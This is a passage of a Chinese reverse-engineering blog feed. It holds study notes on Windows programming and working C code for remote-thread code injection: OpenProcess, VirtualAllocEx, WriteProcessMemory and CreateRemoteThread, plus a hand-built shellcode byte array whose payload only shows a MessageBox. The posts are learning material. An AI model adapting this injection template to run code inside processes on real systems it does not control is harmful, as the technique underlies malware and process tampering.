&lt;h1 id=&quot;红帽杯-XX&quot;&gt;&lt;a href=&quot;#红帽杯-XX&quot; class=&quot;headerlink&quot; title=&quot;红帽杯-XX&quot;&gt;&lt;/a&gt;红帽杯-XX&lt;/h1&gt;&lt;h2 id=&quot;考点&quot;&gt;&lt;a href=&quot;#考点&quot; class</summary>
      
    
    
    
    
    <category term="Reverse" scheme="https://gift1a.github.io/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>Detours学习</title>
    <link href="https://gift1a.github.io/2022/04/15/Detours%E5%AD%A6%E4%B9%A0/"/>
    <id>https://gift1a.github.io/2022/04/15/Detours%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-04-15T07:26:14.000Z</published>
    <updated>2022-04-20T01:23:52.356Z</updated>
    
    
    <summary type="html">Detours</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>API钩取技术</title>
    <link href="https://gift1a.github.io/2022/04/15/API%E9%92%A9%E5%8F%96%E6%8A%80%E6%9C%AF/"/>
    <id>https://gift1a.github.io/2022/04/15/API%E9%92%A9%E5%8F%96%E6%8A%80%E6%9C%AF/</id>
    <published>2022-04-15T06:28:13.000Z</published>
    <updated>2022-04-20T01:21:38.511Z</updated>
    
    
    <summary type="html">API钩取技术</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>使用汇编语言编写注入代码</title>
    <link href="https://gift1a.github.io/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/"/>
    <id>https://gift1a.github.io/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/</id>
    <published>2022-04-14T08:03:09.000Z</published>
    <updated>2022-04-15T06:06:39.553Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-设置"><a href="#0x00-设置" class="headerlink" title="0x00-设置"></a>0x00-设置</h1><p>修改EIP</p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1649925411946.png"></p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1649925229842.png"></p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1649925283278.png" alt="关闭自动填充nop"></p><h1 id="0x01-修改汇编"><a href="#0x01-修改汇编" class="headerlink" title="0x01-修改汇编"></a>0x01-修改汇编</h1><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1649926048838.png"></p><p>输入字符串，Ctrl+E修改，注意字符串以0结尾，最后要加上00</p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1649926227498.png"></p><p>可以发现得到的是汇编代码，OD会自动识别</p><p>只需要选中字符串按下Ctrl+A即可转为字符串</p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1649926333629.png"></p><p>同理修改好<a href="http://www.reversecore.com字符串/">www.reversecore.com字符串</a></p><h2 id="提取汇编"><a href="#提取汇编" class="headerlink" title="提取汇编"></a>提取汇编</h2><p>接下来将插入的asm的机器码进行复制（在内存窗口中复制对应长度的十六进制数据），并修改格式</p><p>得到</p><pre class="language-c" data-language="c"><code class="language-c">char shellcode[] = {0x55,0x8B,0xEC,0x8B,0x75,0x08,0x68,0x6C,0x6C,0x00,0x00,0x68,0x33,0x32,0x2E,0x64,0x68,0x75,0x73,0x65,0x72,0x54,0xFF,0x16,0x68,0x6F,0x78,0x41,0x00,0x68,0x61,0x67,0x65,0x42,0x68,0x4D,0x65,0x73,0x73,0x54,0x50,0xFF,0x56,0x04,0x6A,0x00,0xE8,0x0C,0x00,0x00,0x00,0x52,0x65,0x76,0x65,0x72,0x73,0x65,0x43,0x6F,0x72,0x65,0x00,0xE8,0x14,0x00,0x00,0x00,0x77,0x77,0x77,0x2E,0x72,0x65,0x76,0x65,0x72,0x73,0x65,0x63,0x6F,0x72,0x65,0x2E,0x63,0x6F,0x6D,0x00,0x6A,0x00,0xFF,0xD0,0x33,0xC0,0x8B,0xE5,0x5D,0xC3};</code></pre><h1 id="0x02-代码实现"><a href="#0x02-代码实现" class="headerlink" title="0x02-代码实现"></a>0x02-代码实现</h1><pre class="language-c" data-language="c"><code class="language-c">#include&lt;stdio.h&gt;#include&lt;Windows.h&gt;#include&lt;string.h&gt;BYTE shellcode[] = { 0x55,0x8B,0xEC,0x8B,0x75,0x08,0x68,0x6C,0x6C,0x00,0x00,0x68,0x33,0x32,0x2E,0x64,0x68,0x75,0x73,0x65,0x72,0x54,0xFF,0x16,0x68,0x6F,0x78,0x41,0x00,0x68,0x61,0x67,0x65,0x42,0x68,0x4D,0x65,0x73,0x73,0x54,0x50,0xFF,0x56,0x04,0x6A,0x00,0xE8,0x0C,0x00,0x00,0x00,0x52,0x65,0x76,0x65,0x72,0x73,0x65,0x43,0x6F,0x72,0x65,0x00,0xE8,0x14,0x00,0x00,0x00,0x77,0x77,0x77,0x2E,0x72,0x65,0x76,0x65,0x72,0x73,0x65,0x63,0x6F,0x72,0x65,0x2E,0x63,0x6F,0x6D,0x00,0x6A,0x00,0xFF,0xD0,0x33,0xC0,0x8B,0xE5,0x5D,0xC3};typedef struct _Thread_Param{FARPROC pFunc[2];//Loadlibrary,GetProcAddress}Thread_Param, * pThread_Param;void Asm_Inject(DWORD PID){HMODULE hMod = NULL;HANDLE hProcess = NULL;Thread_Param param[2] = { 0, };HANDLE hThread = NULL;LPVOID pRemoteBuf[2] = { 0, };//获取kernel32.dll的句柄hMod = GetModuleHandleA("kernel32.dll");//将需要使用的函数存储param-&gt;pFunc[0] = GetProcAddress(hMod, "LoadLibraryA");param-&gt;pFunc[1] = GetProcAddress(hMod, "GetProcAddress");//开启进程if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID))){printf("Open Failed!!Error Code:%d\n", GetLastError());return;}//开辟空间并写入if (!(pRemoteBuf[0] = VirtualAllocEx(hProcess, NULL, sizeof(Thread_Param), MEM_COMMIT, PAGE_READWRITE))){printf("VirtualAlloc Failed!!Error Code:%d\n", GetLastError());return;}if (!WriteProcessMemory(hProcess, pRemoteBuf[0], (LPVOID)&amp;param, sizeof(Thread_Param), NULL)){printf("WriteProcess Failed!!Error Code:%d\n", GetLastError());return;}//将我们的shellcode写入if (!(pRemoteBuf[1] = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_READWRITE))){printf("VirtualAlloc Failed!!Error Code:%d\n", GetLastError());return;}if (!WriteProcessMemory(hProcess, pRemoteBuf[1], (LPVOID)&amp;shellcode, sizeof(shellcode), NULL)){printf("WriteProcess Failed!!Error Code:%d\n", GetLastError());return;}hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuf[1], pRemoteBuf[0], 0, NULL);WaitForSingleObject(hThread, INFINITE);CloseHandle(hThread);CloseHandle(hProcess);return;}int main(int argc,char*argv[]){Asm_Inject((DWORD)atol(argv[1]));return 0;}</code></pre><p>本质上和代码注入没区别，主要是我们将字符串也包含在了注入的代码里面，所以在线程函数中不再需要使用字符数组存储</p><h1 id="0x03-分析"><a href="#0x03-分析" class="headerlink" title="0x03-分析"></a>0x03-分析</h1><p>在OD中打开并注入，让其停在新线程</p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1650001855752.png"></p><p>先提升堆栈，然后将函数的参数存入ESI中，也就是线程函数对应的THREAD_PARAM结构体，因为里面只有两个函数指针，所以大小为0x8</p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1650002105819.png" alt="ESI的值"></p><p>我们执行完移动到esi这一步，去内存中查看ESI存储的值</p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1650002164069.png"></p><p>将其转为地址，注释中会告知我们其对应的API函数</p><p>接下来的四个PUSH+call可以知道是调用函数，LoadLibraryA只需要一个参数</p><p>前面三个PUSH是将函数名称压入栈，而最后一个是将当前的ESP的值压入栈，而当前ESP的值正好是存储字符串的地址，这样就实现了给LoadLibraryA传参</p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1650002382351.png"></p><p>需要注意这里是小端序</p><p>接下来的四个PUSH和前面是一样的，关键是最后一个PUSH</p><blockquote><p><strong>因为返回值一般存储在EAX，并且函数调用时入栈顺序是从右往左依次入栈</strong></p></blockquote><p>这里的EAX存储的值就是user32.dll的句柄，也就是地址，在eax寄存器中OD也自动标明了</p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1650002603450.png"></p><p>最后获取到MessageBoxA的地址</p><p>MessageBoxA的传参</p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1650002654110.png"></p><p>这一段本来是字符串，但是OD给我们识别成了代码</p><p>执行完之后</p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1650002721021.png"></p><p>可以看到我们的MessageBoxA的参数都在栈中了</p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1650002770898.png" alt="调用MessageBoxA"></p><p>最后就是清空eax和恢复堆栈了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-设置&quot;&gt;&lt;a href=&quot;#0x00-设置&quot; class=&quot;headerlink&quot; title=&quot;0x00-设置&quot;&gt;&lt;/a&gt;0x00-设置&lt;/h1&gt;&lt;p&gt;修改EIP&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2022/04/14/%E4%BD%BF%E7%94</summary>
      
    
    
    
    
    <category term="Windows" scheme="https://gift1a.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>加密与解密第四版</title>
    <link href="https://gift1a.github.io/2022/04/13/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%AC%E5%9B%9B%E7%89%88/"/>
    <id>https://gift1a.github.io/2022/04/13/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%AC%E5%9B%9B%E7%89%88/</id>
    <published>2022-04-13T01:18:40.000Z</published>
    <updated>2022-04-13T03:21:49.108Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-基础知识"><a href="#0x00-基础知识" class="headerlink" title="0x00-基础知识"></a>0x00-基础知识</h1><h2 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h2><p><img src="/2022/04/13/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%AC%E5%9B%9B%E7%89%88/1649814834555.png"></p><h2 id="大小端序"><a href="#大小端序" class="headerlink" title="大小端序"></a>大小端序</h2><p><img src="/2022/04/13/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%AC%E5%9B%9B%E7%89%88/1649814898304.png"></p><h2 id="Windows操作系统"><a href="#Windows操作系统" class="headerlink" title="Windows操作系统"></a>Windows操作系统</h2><p><img src="/2022/04/13/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%AC%E5%9B%9B%E7%89%88/1649814924513.png" alt="重要DLL"></p><p><img src="/2022/04/13/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%AC%E5%9B%9B%E7%89%88/1649814970448.png" alt="Unicode与ANSI函数"></p><h2 id="WOW64"><a href="#WOW64" class="headerlink" title="WOW64"></a>WOW64</h2><p>WOW64是64位Windows操作系统的子系统，可以使大多数32位应用程序在不修改的情况下运行在64位操作系统上</p><p><img src="/2022/04/13/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%AC%E5%9B%9B%E7%89%88/1649815151630.png" alt="WOW64操作过程"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-基础知识&quot;&gt;&lt;a href=&quot;#0x00-基础知识&quot; class=&quot;headerlink&quot; title=&quot;0x00-基础知识&quot;&gt;&lt;/a&gt;0x00-基础知识&lt;/h1&gt;&lt;h2 id=&quot;字符集&quot;&gt;&lt;a href=&quot;#字符集&quot; class=&quot;headerlink</summary>
      
    
    
    
    
    <category term="Reverse" scheme="https://gift1a.github.io/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>Windows核心编程</title>
    <link href="https://gift1a.github.io/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/"/>
    <id>https://gift1a.github.io/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/</id>
    <published>2022-04-13T01:06:43.000Z</published>
    <updated>2022-04-15T11:20:51.632Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-错误处理"><a href="#0x00-错误处理" class="headerlink" title="0x00-错误处理"></a>0x00-错误处理</h1><p>在WinError.h头文件中包含了Microsoft定义的错误代码列表，每个错误都有三种表示：一个消息ID(一个可在源代码使用的宏，用于与GetLastError的返回值进行比较)、消息文本(描述错误的英文文本)和一个编号(应该避免使用此编号，尽量使用消息ID)</p><p>所以在Windows函数失败之后，应该立马调用GetLastError()</p><h1 id="0x01-字符和字符串处理"><a href="#0x01-字符和字符串处理" class="headerlink" title="0x01-字符和字符串处理"></a>0x01-字符和字符串处理</h1><h2 id="ANSI与UNCODE"><a href="#ANSI与UNCODE" class="headerlink" title="ANSI与UNCODE"></a>ANSI与UNCODE</h2><blockquote><p>在Windows Vista中，每个Unicode字符都使用UTF-16编码，UTF-16将每个字符编码为2个字节也就是16位</p></blockquote><p>我们知道在C语言中，char数据类型表示一个8位ANSI字符，也就是一个字节</p><p>当我们声明Unicode字符和字符串时，只需要在字符串前加上”L“，表示以UTF-16来编码每个字符</p><p><img src="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1649813453705.png"></p><h2 id="Unicode函数与ANSI函数"><a href="#Unicode函数与ANSI函数" class="headerlink" title="Unicode函数与ANSI函数"></a>Unicode函数与ANSI函数</h2><p>自Windows NT起，Windows所有的版本都完全用Unicode来构建。也就是说所有核心函数(创建窗口、显示文本、进行字符串处理)都需要Unicode字符串</p><p>在Windows中，Windows函数通常具有两个版本，用于接收不同的字符串</p><p><img src="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1649813717040.png"></p><p><img src="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1649813766466.png" alt="默认版本"></p><h2 id="C运行库中的Unicode函数和ANSI函数"><a href="#C运行库中的Unicode函数和ANSI函数" class="headerlink" title="C运行库中的Unicode函数和ANSI函数"></a>C运行库中的Unicode函数和ANSI函数</h2><p>和Windows函数一样，C运行库提供了一系列函数处理ANSI字符和字符串，并提供了一系列函数来处理Unicode字符与字符串</p><p>在C运行库中，strlen就是一个能返回ANSI字符串长度的函数。与之对应的是wcslen，这个C运行库函数能返回Unicode字符串的长度，这两个函数都在string.h中</p><h2 id="C运行库中的安全字符串函数"><a href="#C运行库中的安全字符串函数" class="headerlink" title="C运行库中的安全字符串函数"></a>C运行库中的安全字符串函数</h2><blockquote><p><strong>任何修改字符串的函数都存在一个安全隐患：如果目标字符串缓冲区不够大，无法容纳所生成的字符串，就会导致内存中的数据被破坏</strong></p></blockquote><p><img src="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1650011578747.png" alt="例子"></p><p>为了防止被被恶意软件肆意滥用，微软提供了一系列新的函数来取代C运行库的不安全的字符串处理函数</p><p><img src="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1650011917625.png"></p><p><img src="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1650012022950.png"></p><p>书中没有详细介绍，可以自行查找</p><p><img src="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1650012306710.png" alt="安全字符串函数"></p><p><img src="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1650012361902.png" alt="安全字符串函数执行"></p><h1 id="Windows字符串函数"><a href="#Windows字符串函数" class="headerlink" title="Windows字符串函数"></a>Windows字符串函数</h1><p>不知道讲了些啥</p><h2 id="为何要用Unicode"><a href="#为何要用Unicode" class="headerlink" title="为何要用Unicode"></a>为何要用Unicode</h2><p><img src="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1650012784209.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-错误处理&quot;&gt;&lt;a href=&quot;#0x00-错误处理&quot; class=&quot;headerlink&quot; title=&quot;0x00-错误处理&quot;&gt;&lt;/a&gt;0x00-错误处理&lt;/h1&gt;&lt;p&gt;在WinError.h头文件中包含了Microsoft定义的错误代码列表，每个错误都</summary>
      
    
    
    
    
    <category term="Windows" scheme="https://gift1a.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>代码注入</title>
    <link href="https://gift1a.github.io/2022/04/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"/>
    <id>https://gift1a.github.io/2022/04/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/</id>
    <published>2022-04-12T03:41:45.000Z</published>
    <updated>2022-04-14T14:07:08.493Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00-前言"></a>0x00-前言</h1><p>感觉《逆向工程核心原理》只是进行了一点介绍，但是我理解能力有限</p><p>于是翻阅到了这篇文章</p><p><a href="https://www.52pojie.cn/thread-1270499-1-1.html">https://www.52pojie.cn/thread-1270499-1-1.html</a></p><h1 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01-原理"></a>0x01-原理</h1><p>在DLL注入中，我们通过远程线程在目标进程中调用LoadLibraryA()函数加载我们的DLL</p><p><img src="/2022/04/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/1649738932188.png"></p><p>实际上只要我们定义的函数符合CreateRemoteThread参数中定义的函数模板，就可以通过远程线程的方式去执行它，而不限于LoadLibraryA</p><pre class="language-c" data-language="c"><code class="language-c">DWORD WINAPI ThreadProc(  _In_ LPVOID lpParameter);</code></pre><p>所以我们只要定义一个只有一个参数的函数，把它转换成 LPTHREAD_START_ROUTINE（CreateRemoteThread的参数）即可。</p><p>但是这里产生了一个问题，如果我们的函数具有多个参数怎么办呢，要成功调用函数的话，我们的参数也需要在目标进程的虚拟内存中</p><blockquote><p>对于将我们的参数写入虚拟内存中，我们可以使用VirtualAllocEx函数向目标申请内存虚拟空间</p><p>对于多个参数，我们可以构建一个结构体存放所有的参数，然后在调用的时候通过内存偏移来访问参数</p></blockquote><pre class="language-c" data-language="c"><code class="language-c">typedef struct _INJECT_DATA{    char lpText[8];  //参数1    char lpCaption[8];  //参数2}INJECT_DATA;</code></pre><p>下面以MessageBoxA函数为例</p><h2 id="定义函数指针"><a href="#定义函数指针" class="headerlink" title="定义函数指针"></a>定义函数指针</h2><p>首先先进行定义我们要使用到的函数指针</p><p>因为我们要调用user32.dll中的MessageBoxA，所以要使用LoadLibraryA()加载user32.dll，并且使用GetProcAddress()获取MessageBoxA的函数地址</p><pre class="language-c" data-language="c"><code class="language-c">//定义函数指针，方便调用HOMDULE是返回值，WINAPI也就是__stdcall，是调用约定，类型名为PFLOADLIBRARYA，lpLivFileName是参数typedef HMODULE(WINAPI *PFLOADLIBRARYA)(LPCSTR lpLibFileName);//前面的是返回值，中间是类型typedef FARPROC(WINAPI *PFGETPROCADDRESS)(HMODULE hModule,LPCSTR lpProcName);//返回值是一个回调函数typedef int (WINAPI *PFMESSAGEBOXA)(HWND hWnd,LPCSTR lpText,LPCSTR lpCaption,UINT uType);</code></pre><h2 id="定义线程信息块"><a href="#定义线程信息块" class="headerlink" title="定义线程信息块"></a>定义线程信息块</h2><p>使用结构体存储我们要调用的函数信息</p><pre class="language-c" data-language="c"><code class="language-c">//创建一个存储线程信息的结构体typedef struct _THREAD_PARAM//定义线程信息{    FARPROC pFunc[2];               // LoadLibraryA(), GetProcAddress()      char    szBuf[4][128];          // "user32.dll", "MessageBoxA", "Inject Success!!", "Hint"  } THREAD_PARAM, * PTHREAD_PARAM;//分别是线程信息块和指向线程信息的指针</code></pre><h2 id="线程信息块赋值"><a href="#线程信息块赋值" class="headerlink" title="线程信息块赋值"></a>线程信息块赋值</h2><pre class="language-c" data-language="c"><code class="language-c">hMod = GetModuleHandleA("kernel32.dll");//先给线程信息块赋值 param.pFunc[0] = GetProcAddress(hMod, "LoadLibraryA");param.pFunc[1] = GetProcAddress(hMod, "GetProcAddress");//因为kernel32在内存中优先被装载，所以在不同进程中都一样strcpy_s(param.szBuf[0], "user32.dll");strcpy_s(param.szBuf[1], "MessageBoxA");strcpy_s(param.szBuf[2], "InjectCode Success!!");strcpy_s(param.szBuf[3], "Hint");</code></pre><h2 id="打开目标进程"><a href="#打开目标进程" class="headerlink" title="打开目标进程"></a>打开目标进程</h2><pre class="language-c" data-language="c"><code class="language-c">//开启进程      if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwPID)))                  {        printf("OpenProcess() fail : err_code = %d\n", GetLastError());        return FALSE;    }</code></pre><h2 id="开辟内存并写入线程信息"><a href="#开辟内存并写入线程信息" class="headerlink" title="开辟内存并写入线程信息"></a>开辟内存并写入线程信息</h2><p>第一次写入的是线程函数要调用的函数信息</p><pre class="language-c" data-language="c"><code class="language-c">//为注入的线程信息块中的第一个函数开辟内存     dwSize = sizeof(THREAD_PARAM);    if (!(pRemoteBuf[0] = VirtualAllocEx(hProcess,NULL,dwSize,MEM_COMMIT,PAGE_READWRITE)))        {        printf("VirtualAllocEx() fail : err_code = %d\n", GetLastError());        return FALSE;    }    //写入线程信息块中函数的值和参数到进程中    if (!WriteProcessMemory(hProcess,pRemoteBuf[0],(LPVOID)&amp;param,dwSize,NULL))    {        printf("WriteProcessMemory() fail : err_code = %d\n", GetLastError());        return FALSE;    }</code></pre><p>第二次将线程函数写入内存</p><pre class="language-c" data-language="c"><code class="language-c">//再次开辟      dwSize = (DWORD)InjectCode - (DWORD)ThreadProc;    if (!(pRemoteBuf[1] = VirtualAllocEx(hProcess,NULL,dwSize,MEM_COMMIT,PAGE_EXECUTE_READWRITE)))    {        printf("VirtualAllocEx() fail : err_code = %d\n", GetLastError());        return FALSE;    }    //函数调用    if (!WriteProcessMemory(hProcess,pRemoteBuf[1],(LPVOID)ThreadProc,dwSize,NULL))    {        printf("WriteProcessMemory() fail : err_code = %d\n", GetLastError());        return FALSE;    }</code></pre><h2 id="开启远程线程"><a href="#开启远程线程" class="headerlink" title="开启远程线程"></a>开启远程线程</h2><p>在目标线程中开启远程线程</p><pre class="language-c" data-language="c"><code class="language-c">if (!(hThread = CreateRemoteThread(hProcess,NULL,0,(LPTHREAD_START_ROUTINE)pRemoteBuf[1],pRemoteBuf[0],0,NULL)))    {        printf("CreateRemoteThread() fail : err_code = %d\n", GetLastError());        return FALSE;    }</code></pre><h2 id="线程函数实现调用"><a href="#线程函数实现调用" class="headerlink" title="线程函数实现调用"></a>线程函数实现调用</h2><p>开启线程后会调用线程函数，把我们写入进程内存中的信息读取到要调用的函数中，最后实现调用</p><pre class="language-c" data-language="c"><code class="language-c">//这里的WINAPI是调用约定，相当于__stdcall//线程函数，线程开始的地方DWORD WINAPI ThreadProc(LPVOID lParam){    PTHREAD_PARAM   pParam = (PTHREAD_PARAM)lParam;    HMODULE         hMod = NULL;    FARPROC         pFunc = NULL;    // LoadLibrary()，将pFunc[0]强制转换为这样类型的函数指针，pParam-&gt;szBuf[0]是该函数的参数    hMod = ((PFLOADLIBRARYA)pParam-&gt;pFunc[0])(pParam-&gt;szBuf[0]);    // "user32.dll"，第二个括号内的是函数的参数    if (!hMod)        return 1;    // GetProcAddress()，返回值是回调函数，pFunc就是函数指针    pFunc = (FARPROC)((PFGETPROCADDRESS)pParam-&gt;pFunc[1])(hMod, pParam-&gt;szBuf[1]);  // "MessageBoxA" ，获取到MessageBoxA的地址     if (!pFunc)        return 1;    // MessageBoxA()      ((PFMESSAGEBOXA)pFunc)(NULL, pParam-&gt;szBuf[2], pParam-&gt;szBuf[3], MB_OK);//最后的调用    return 0;}</code></pre><h1 id="0x02-代码实现"><a href="#0x02-代码实现" class="headerlink" title="0x02-代码实现"></a>0x02-代码实现</h1><pre class="language-c" data-language="c"><code class="language-c">#include&lt;string.h&gt;#include "windows.h"  #include "stdio.h" //创建一个存储线程信息的结构体typedef struct _THREAD_PARAM//定义线程信息{    FARPROC pFunc[2];               // LoadLibraryA(), GetProcAddress()      char    szBuf[4][128];          // "user32.dll", "MessageBoxA", "www.reversecore.com", "ReverseCore"  } THREAD_PARAM, * PTHREAD_PARAM;//分别是线程信息块和指向线程信息的指针//定义函数指针，方便调用HOMDULE是返回值，WINAPI也就是__stdcall，是调用约定，类型名为PFLOADLIBRARYA，lpLivFileName是参数typedef HMODULE(WINAPI *PFLOADLIBRARYA)(LPCSTR lpLibFileName);//前面的是返回值，中间是类型typedef FARPROC(WINAPI *PFGETPROCADDRESS)(HMODULE hModule,LPCSTR lpProcName);//返回值是一个回调函数typedef int (WINAPI *PFMESSAGEBOXA)(HWND hWnd,LPCSTR lpText,LPCSTR lpCaption,UINT uType);//这里的WINAPI是调用约定，相当于__stdcall//线程函数，线程开始的地方DWORD WINAPI ThreadProc(LPVOID lParam){    PTHREAD_PARAM   pParam = (PTHREAD_PARAM)lParam;    HMODULE         hMod = NULL;    FARPROC         pFunc = NULL;    // LoadLibrary()，将pFunc[0]强制转换为这样类型的函数指针，pParam-&gt;szBuf[0]是该函数的参数    hMod = ((PFLOADLIBRARYA)pParam-&gt;pFunc[0])(pParam-&gt;szBuf[0]);    // "user32.dll"，第二个括号内的是函数的参数    if (!hMod)        return 1;    // GetProcAddress()，返回值是回调函数，pFunc就是函数指针    pFunc = (FARPROC)((PFGETPROCADDRESS)pParam-&gt;pFunc[1])(hMod, pParam-&gt;szBuf[1]);  // "MessageBoxA" ，获取到MessageBoxA的地址     if (!pFunc)        return 1;    // MessageBoxA()      ((PFMESSAGEBOXA)pFunc)(NULL, pParam-&gt;szBuf[2], pParam-&gt;szBuf[3], MB_OK);//最后的调用    return 0;}BOOL InjectCode(DWORD dwPID){    HMODULE         hMod = NULL;    THREAD_PARAM    param = { 0, };    HANDLE          hProcess = NULL;    HANDLE          hThread = NULL;    LPVOID          pRemoteBuf[2] = { 0, };    DWORD           dwSize = 0;    hMod = GetModuleHandleA("kernel32.dll");    //先给线程信息块赋值     param.pFunc[0] = GetProcAddress(hMod, "LoadLibraryA");    param.pFunc[1] = GetProcAddress(hMod, "GetProcAddress");//因为kernel32在内存中优先被装载，所以在不同进程中都一样    strcpy_s(param.szBuf[0], "user32.dll");    strcpy_s(param.szBuf[1], "MessageBoxA");    strcpy_s(param.szBuf[2], "InjectCode Success!!");    strcpy_s(param.szBuf[3], "Hint");    //开启进程      if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwPID)))                  {        printf("OpenProcess() fail : err_code = %d\n", GetLastError());        return FALSE;    }    //为注入的线程信息块中的第一个函数开辟内存     dwSize = sizeof(THREAD_PARAM);    if (!(pRemoteBuf[0] = 